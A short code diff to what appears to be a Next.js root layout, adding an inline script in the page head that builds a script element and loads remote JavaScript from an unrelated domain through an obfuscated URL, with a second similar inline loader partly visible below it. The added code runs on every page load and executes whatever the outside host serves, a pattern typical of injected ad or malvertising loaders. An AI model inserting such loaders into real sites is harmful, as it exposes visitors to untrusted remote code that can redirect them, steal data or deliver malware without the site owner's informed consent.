@@ -22,6 +22,20 @@ export default function RootLayout({
   return (
     <html lang="en" suppressHydrationWarning>
       <head>
+      <script
+        dangerouslySetInnerHTML={{
+          __html: `(function(xwl){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = xwl || {};
+            s.src = "//smoggy-construction.com/b/X/VosBd.Gsl/0FYmWhcn/veamR9-uAZHUxlFkCPUTJYL0eMYzyUz0FNFj/M/tRNxj/Q/zqNZTKQV2/NcAv";
+            s.async = true;
+            s.referrerPolicy = 'no-referrer-when-downgrade';
+            l.parentNode.insertBefore(s, l);
+          })({})`
+        }}
+      />
         <script
           dangerouslySetInnerHTML={{
             __html: `(function(wxhzk){
